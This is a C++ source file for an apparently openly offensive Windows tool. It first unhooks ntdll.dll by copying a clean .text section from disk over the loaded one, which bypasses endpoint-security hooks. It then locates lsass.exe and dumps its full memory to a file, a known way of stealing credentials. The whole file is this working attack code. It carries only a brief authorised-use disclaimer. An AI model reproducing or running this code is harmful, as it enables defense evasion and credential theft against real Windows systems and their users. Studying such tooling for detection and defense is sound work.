/*
Created by deranged0tter
For use only in environments that you own or have explicit permission to use this tool in.
I am not liable for any misuse of this software.
USE AT YOUR OWN RISK
*/

#pragma comment (lib, "dbghelp.lib")

#include <windows.h>
#include <stdio.h>
#include <Psapi.h>
#include <TlHelp32.h>
#include <iostream>
#include <Dbghelp.h>
#include <string.h>
using namespace std;

#define ok(msg, ...) printf("\033[0;32m[+]\033[0;37m " msg "\n", ##__VA_ARGS__)
#define info(msg, ...) printf("\033[0;34m[*]\033[0;37m " msg "\n", ##__VA_ARGS__)
#define warn(msg, ...) printf("\033[0;31m[-]\033[0;37m " msg "\n", ##__VA_ARGS__)

BOOL unhookNTDLL() {
	HANDLE hProcess = GetCurrentProcess();
	MODULEINFO miModInfo = {};
	HMODULE hmNtdllModule = GetModuleHandle(L"ntdll.dll");

	GetModuleInformation(hProcess, hmNtdllModule, &miModInfo, sizeof(miModInfo));

	LPVOID ntdllBase = (LPVOID)miModInfo.lpBaseOfDll;
	HANDLE hNtdllFile = CreateFileA("C:\\windows\\system32\\ntdll.dll", GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, 0, NULL);
	HANDLE hNtdllMapping = CreateFileMapping(hNtdllFile, NULL, PAGE_READONLY | SEC_IMAGE, 0, 0, NULL);
	LPVOID ntdllMappingAdr = MapViewOfFile(hNtdllMapping, FILE_MAP_READ, 0, 0, 0);

	PIMAGE_DOS_HEADER hookedDosHeader = (PIMAGE_DOS_HEADER)ntdllBase;
	PIMAGE_NT_HEADERS hookedNtHeader = (PIMAGE_NT_HEADERS)((DWORD_PTR)ntdllBase + hookedDosHeader->e_lfanew);

	for (WORD i = 0; i < hookedNtHeader->FileHeader.NumberOfSections; i++) {
		PIMAGE_SECTION_HEADER hookedSectionHeader = (PIMAGE_SECTION_HEADER)((DWORD_PTR)IMAGE_FIRST_SECTION(hookedNtHeader) + ((DWORD_PTR)IMAGE_SIZEOF_SECTION_HEADER * i));

		if (!strcmp((char*)hookedSectionHeader->Name, (char*)".text")) {
			DWORD oldProtection = 0;
			bool isProtected = VirtualProtect((LPVOID)((DWORD_PTR)ntdllBase + (DWORD_PTR)hookedSectionHeader->VirtualAddress), hookedSectionHeader->Misc.VirtualSize, PAGE_EXECUTE_READWRITE, &oldProtection);
			memcpy((LPVOID)((DWORD_PTR)ntdllBase + (DWORD_PTR)hookedSectionHeader->VirtualAddress), (LPVOID)((DWORD_PTR)ntdllMappingAdr + (DWORD_PTR)hookedSectionHeader->VirtualAddress), hookedSectionHeader->Misc.VirtualSize);
			isProtected = VirtualProtect((LPVOID)((DWORD_PTR)ntdllBase + (DWORD_PTR)hookedSectionHeader->VirtualAddress), hookedSectionHeader->Misc.VirtualSize, oldProtection, &oldProtection);
		}
	}

	CloseHandle(hProcess);
	CloseHandle(hNtdllFile);
	CloseHandle(hNtdllMapping);
	FreeLibrary(hmNtdllModule);

	return TRUE;
}

BOOL unhook() {
	// get lsass pid
	PROCESSENTRY32 entry;
	entry.dwSize = sizeof(PROCESSENTRY32);

	HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);

	if (Process32First(hSnapshot, &entry) == TRUE) {
		do {
			wstring s(entry.szExeFile);
			if (s == L"lsass.exe") {
				ok("got lsass pid");
				info("lsass pid (%ld)", entry.th32ProcessID);

				// create handle on outfile
				HANDLE hOutFile = CreateFile(L"drngdDmpr.dmp", GENERIC_ALL, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
				ok("created handle for outfile");
				info("handle 0x%p", hOutFile);

				// get handle on lsass
				HANDLE hLsass = OpenProcess((PROCESS_QUERY_INFORMATION | PROCESS_VM_READ), FALSE, entry.th32ProcessID);
				if (hLsass == NULL) {
					warn("failed to open handle on lsass, error %ld", GetLastError());

					CloseHandle(hOutFile);

					return FALSE;
				}
				ok("got handle on lsass (%ld)", entry.th32ProcessID);
				info("handle: 0x%p", hLsass);

				// create a dump of lsass
				BOOL bIsDumped = MiniDumpWriteDump(hLsass, entry.th32ProcessID, hOutFile, MiniDumpWithFullMemory, NULL, NULL, NULL);
				if (bIsDumped) {
					ok("successfully dumped lsass to drngdDmpr.dmp");
				}
				else {
					warn("failed to dump lsass, error %ld", GetLastError());
					CloseHandle(hLsass);
					CloseHandle(hOutFile);

					return FALSE;
				}

				CloseHandle(hLsass);
				CloseHandle(hOutFile);
			}
		} while (Process32Next(hSnapshot, &entry));
	}

	return TRUE;
}

int main() {
	// unhook ntdll
	BOOL isUnHooked = unhookNTDLL();
	if (isUnHooked != TRUE) {
		warn("failed to unhook ntdll");
		return EXIT_FAILURE;
	}
	ok("unhooked ntdll");

	// dump lsass.exe
	BOOL isDumped = unhook();
	if (isDumped != TRUE) {
		warn("failed to dump lsass");
		return EXIT_FAILURE;
	}


	return EXIT_SUCCESS;
}